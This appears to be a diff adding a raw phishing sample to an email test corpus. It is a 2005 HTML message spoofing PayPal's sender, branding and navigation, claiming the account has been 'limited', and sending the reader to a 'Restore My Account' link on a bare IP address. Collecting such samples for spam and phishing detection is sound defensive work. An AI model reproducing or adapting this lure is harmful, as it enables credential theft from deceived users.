@@ -1,0 +1,103 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 4E26C2A88C
+ for <user@example.com>; Sun, 30 Oct 2005 08:55:44 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 49AB1621C78; Sun, 30 Oct 2005 08:55:44 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 2A6D8621C71
+ for <user@example.com>; Sun, 30 Oct 2005 08:55:44 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id IAA08824
+ for user@example.com; Sun, 30 Oct 2005 08:55:43 -0500
+Received: from ibserver11.com (ibserver11.com [204.200.196.250])
+ by mail.example.com with ESMTP id IAA08815
+ for <user@biochemistry.BIOC.cwru.edu>; Sun, 30 Oct 2005 08:55:43 -0500
+Received: from ibserver11.com (localhost [127.0.0.1])
+ by ibserver11.com (8.13.1/8.13.1) with ESMTP id j9TLdmlK072119
+ for <user@biochemistry.BIOC.cwru.edu>; Sat, 29 Oct 2005 21:59:33 GMT
+Received: (from test1@localhost)
+ by ibserver11.com (8.13.1/8.13.1/Submit) id j9TKDp07065760
+ for user@example.com; Sat, 29 Oct 2005 16:13:51 -0400 (EDT)
+Date: Sat, 29 Oct 2005 16:13:51 -0400 (EDT)
+To: user@biochemistry.BIOC.cwru.edu
+Subject: Please Verify Account !
+Message-ID: <1130616831.28536.qmail@arribada.ebay.com>
+From: "PayPal" <support@paypal.com>
+Content-Type: text/html
+Content-Length: 7192
+Lines: 67
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 219
+
+<DIV id=xptHeader>
+<TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+<TBODY>
+<TR>
+<TD noWrap><IMG alt="" src="https://www.paypalobjects.com/en_US/i/logo/paypal_logo.gif" border=0></TD>
+<TD class=cobrand align=middle width="100%">&nbsp;</TD>
+<TD noWrap align=right><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_logout" target=_blank><FONT color=#003399>Log&nbsp;Out</FONT></A>&nbsp;|&nbsp;<A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_help&amp;source_page=_login-done" target=_blank><FONT color=#003399>Help</FONT></A> </TD></TR></TBODY></TABLE></DIV>
+<DIV id=xptTabs>
+<TABLE class=primary cellSpacing=0 cellPadding=0 align=center border=0>
+<TBODY>
+<TR>
+<TD><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account" target=_blank><IMG alt="My Account" src="https://www.paypalobjects.com/en_US/i/nav/P_off_my_account.gif" border=0></A></TD>
+<TD><IMG height=1 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=1 border=0></TD>
+<TD><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_transaction-run" target=_blank><IMG alt="Send Money" src="https://www.paypalobjects.com/en_US/i/nav/P_off_send_money.gif" border=0></A></TD>
+<TD><IMG height=1 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=1 border=0></TD>
+<TD><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_request-money" target=_blank><IMG alt="Request Money" src="https://www.paypalobjects.com/en_US/i/nav/P_off_request_money.gif" border=0></A></TD>
+<TD><IMG height=1 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=1 border=0></TD>
+<TD><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_merchant" target=_blank><IMG alt="Merchant Tools" src="https://www.paypalobjects.com/en_US/i/nav/P_off_merchant_tools.gif" border=0></A></TD>
+<TD><IMG height=1 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=1 border=0></TD>
+<TD><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_auction" target=_blank><IMG alt="Auction Tools" src="https://www.paypalobjects.com/en_US/i/nav/P_off_auction_tools.gif" border=0></A></TD></TR></TBODY></TABLE></DIV>
+<DIV id=xptContentMain>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR>
+<TD><IMG height=1 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=600 border=0></TD></TR>
+<TR>
+<TD>
+<DIV id=xptTitle>
+<TABLE class=main cellSpacing=0 cellPadding=0 align=center border=0>
+<TBODY>
+<TR>
+<TD class=heading width="100%"></TD></TR>
+<TR>
+<TD><IMG height=2 alt="" src="https://www.paypalobjects.com/en_US/i/nav/pixel.gif" width=1 border=0></TD></TR>
+<TR>
+<TD>
+<HR>
+</TD></TR></TBODY></TABLE></DIV></TD></TR>
+<TR>
+<TD vAlign=top><BR><BR><BR><BR>PayPal is constantly working to ensure security by regularly screening the accounts in our system. We recently reviewed your account, and we need more information to help us provide you with secure service. Until we can collect this information, your access to sensitive account features will be limited. We would like to restore your access as soon as possible, and we apologize for the inconvenience. <BR>
+<HR class=dotted>
+<SPAN class=emphasis>Why is my account access limited?</SPAN><BR><BR class=h6>Your account access has been limited for the following reason(s):<BR><BR>
+<LI><SPAN class=emphasis>Aug. 8, 2005: </SPAN>We would like to ensure that your account was not accessed by an unauthorized third party. Because protecting the security of your account is our primary concern, we have limited access to sensitive PayPal account features. We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection. <BR><BR>(Your case ID for this reason is PP-087-160-864.)<BR><BR>
+<HR class=dotted>
+<SPAN class=emphasis>How can I restore my account access?</SPAN><BR><BR>
+<TABLE cellSpacing=0 cellPadding=1 width="100%" align=center bgColor=#cc9999>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" align=center bgColor=#ffeeee>
+<TBODY>
+<TR>
+<TD><SPAN class=emphasis>Please confirm your identity here: <A onclick="return ShowLinkWarning()" href="http://210.243.12.2/~jan/www.paypal.com/" target=_blank><FONT color=#003399>Restore My Account</FONT></A> and complete the "Steps to Remove Limitations." </SPAN></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><BR>Completing all of the checklist items will automatically restore your account access.<BR>
+<HR class=dotted>
+</LI></TD></TR></TBODY></TABLE></DIV>
+<DIV id=xptFooter>
+<TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+<TBODY>
+<TR>
+<TD>
+<P><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/mobile" target=_blank><FONT color=#003399>Mobile</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_batch-payment-overview" target=_blank><FONT color=#003399>Mass Pay</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_upgrade-interest-marcom" target=_blank><FONT color=#003399>Money Market</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_dc-intro" target=_blank><FONT color=#003399>ATM/Debit Card</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_pay-bill" target=_blank><FONT color=#003399>BillPay</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_web-referrals-mrb" target=_blank><FONT color=#003399>Referrals</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/about" target=_blank><FONT color=#003399>About Us</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/general/PayPalAccountTypes!
+ " target=_blank><FONT color=#003399>Accounts</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees" target=_blank><FONT color=#003399>Fees</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy" target=_blank><FONT color=#003399>Privacy</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_bc-signup" target=_blank><FONT color=#003399>Buyer Credit</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_security-center" target=_blank><FONT color=#003399>Security Center</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_contact_us" target=_blank><FONT color=#003399>Contact Us</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/ua" target=_blank><FONT color=#003399>User Agreement</FONT></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_pdn-intro" target=_blank><FONT color=#003399>Developers</FONT></A> | <A href="https://www.paypal.com/us/c!
+ gi-bin/webscr?cmd=_shop" target=_blank><FONT color=#003399>Sho!
+ ps</FONT
+></A> | <A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-pie-available" target=_blank><FONT color=#003399>Gift Certificates/Points</FONT></A></P>
+<P><A class=ebayLink href="http://www.ebay.com/" target=_blank><FONT color=#003399>PayPal, an eBay company</FONT></A></P>
+<P class=lastPara>Copyright © 1999-2005 PayPal. All rights reserved.<BR><A href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/fdic" target=_blank><FONT color=#003399>Information about FDIC pass-through insurance</FONT></A><BR></P></TD></TR></TBODY></TABLE></DIV>
